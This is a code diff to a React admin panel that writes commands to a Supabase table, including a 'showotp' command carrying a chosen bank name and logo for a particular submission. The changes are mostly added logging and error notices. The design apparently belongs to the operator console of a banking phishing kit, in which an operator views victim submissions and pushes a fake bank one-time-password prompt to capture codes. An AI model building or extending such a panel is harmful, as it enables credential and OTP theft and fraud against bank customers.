@@ -184,28 +184,34 @@ const AdminPanel = () => {
   }, []);
 
   const sendCommand = async (command: string, submissionId?: string, bankData?: { name: string; logo: string }) => {
-    console.log('Sending command via Supabase:', command, submissionId, bankData);
-    showNotification(`${command.toUpperCase()} has been initiated`);
+    console.log('Admin Panel: Sending command via Supabase:', command, submissionId, bankData);
+    showNotification(`${command.toUpperCase()} command sent`);
     
     try {
       const commandData: any = {
         command,
-        submission_id: submissionId || null
+        submission_id: submissionId || null,
+        created_at: new Date().toISOString()
       };
       
       if (bankData) {
         commandData.bank_name = bankData.name;
         commandData.bank_logo = bankData.logo;
+        console.log('Admin Panel: Including bank data:', bankData);
       }
       
-      const { error } = await supabase
+      console.log('Admin Panel: Final command data:', commandData);
+      
+      const { data, error } = await supabase
         .from('admin_commands')
-        .insert([commandData]);
+        .insert([commandData])
+        .select();
       
       if (error) {
-        console.error('Error sending command:', error);
+        console.error('Admin Panel: Error sending command:', error);
+        showNotification('Error sending command');
       } else {
-        console.log('Command sent successfully via Supabase');
+        console.log('Admin Panel: Command sent successfully:', data);
         
         // Update submission to remove new status
         if (submissionId) {
@@ -215,7 +221,8 @@ const AdminPanel = () => {
         }
       }
     } catch (error) {
-      console.error('Error with Supabase command:', error);
+      console.error('Admin Panel: Error with Supabase command:', error);
+      showNotification('Error with command');
     }
   };
 
@@ -251,14 +258,14 @@ const AdminPanel = () => {
   };
 
   const handleShowOtp = (submissionId: string) => {
-    console.log('Show OTP clicked for submission:', submissionId);
+    console.log('Admin Panel: Show OTP clicked for submission:', submissionId);
     setSelectedSubmissionId(submissionId);
     setShowBankModal(true);
   };
 
   const handleBankSelect = (bankName: string, bankLogo: string) => {
-    console.log('Bank selected:', bankName, bankLogo);
-    console.log('Sending command with submission ID:', selectedSubmissionId);
+    console.log('Admin Panel: Bank selected:', bankName, bankLogo);
+    console.log('Admin Panel: Sending showotp command with submission ID:', selectedSubmissionId);
     sendCommand('showotp', selectedSubmissionId, { name: bankName, logo: bankLogo });
     setShowBankModal(false);
   };
